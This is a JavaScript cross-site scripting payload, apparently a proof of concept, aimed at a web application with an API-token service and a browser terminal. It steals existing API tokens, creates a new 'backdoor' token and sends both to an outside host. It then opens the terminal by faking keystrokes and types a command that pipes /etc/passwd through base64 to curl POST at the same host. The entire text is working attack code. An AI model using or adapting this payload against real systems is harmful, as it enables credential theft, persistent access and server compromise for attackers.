(async function() {
    const EXFIL = 'https://0fqoaoy7.c5.rs';
    const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    function exfil(type, data) {
        const payload = btoa(JSON.stringify({
            type: type,
            data: data,
            timestamp: new Date().toISOString(),
            domain: document.domain
        }));
        new Image().src = EXFIL + '?type=' + encodeURIComponent(type) + 
                          '&d=' + encodeURIComponent(payload.slice(0, 2000));
    }
    
    exfil('xss_executed', { domain: document.domain, url: location.href });
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/list', {
            credentials: 'include'
        });
        if (resp.ok) {
            const tokens = await resp.json();
            exfil('stolen_existing_tokens', tokens);
        }
    } catch(e) {}
    
    try {
        const resp = await fetch('/api/user_management/v1/api-tokens/create', {
            method: 'POST',
            credentials: 'include'
        });
        if (resp.ok) {
            const newToken = await resp.json();
            exfil('backdoor_token_created', newToken);
        }
    } catch(e) {}
    
    async function openTerminalAndExecute() {
        exfil('terminal_start', 'Opening terminal...');
        
        const toggleTermEvent = new KeyboardEvent('keydown', {
            key: '`',
            code: 'Backquote',
            keyCode: 192,
            ctrlKey: true,
            shiftKey: true,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(toggleTermEvent);
        document.body.dispatchEvent(toggleTermEvent);
        
        await wait(2000);
        
        let terminalInput = document.querySelector('.xterm-helper-textarea');
        
        if (!terminalInput) {
            const terminalBtn = document.querySelector('[data-test="terminal"], [title*="Terminal"], .terminal-button');
            if (terminalBtn) {
                terminalBtn.click();
                await wait(2000);
                terminalInput = document.querySelector('.xterm-helper-textarea');
            }
        }
        
        if (!terminalInput) {
            exfil('terminal_error', 'Terminal input not found');
            return;
        }
        
        exfil('terminal_found', 'Terminal input found, typing command...');
        
        terminalInput.focus();
        await wait(500);
        
        const command = 'cat /etc/passwd | base64 | curl -X POST -d @- https://0fqoaoy7.c5.rs?type=passwd_exfil';
        
        for (let i = 0; i < command.length; i++) {
            const char = command[i];
            const charCode = char.charCodeAt(0);
            
            const keypressEvent = new KeyboardEvent('keypress', {
                key: char,
                code: `Key${char.toUpperCase()}`,
                keyCode: charCode,
                charCode: charCode,
                which: charCode,
                bubbles: true,
                cancelable: true
            });
            
            terminalInput.dispatchEvent(keypressEvent);
            await wait(5);
        }
        
        await wait(300);
        
        const enterEvent = new KeyboardEvent('keydown', {
            key: 'Enter',
            code: 'Enter',
            keyCode: 13,
            bubbles: true,
            cancelable: true
        });
        terminalInput.dispatchEvent(enterEvent);
        
        exfil('terminal_command_sent', 'Command executed');
    }
    
    setTimeout(openTerminalAndExecute, 3000);
    
    exfil('xss_complete', 'Exploitation complete');
    console.log('[POC] XSS executed on: ' + document.domain);
    
})();
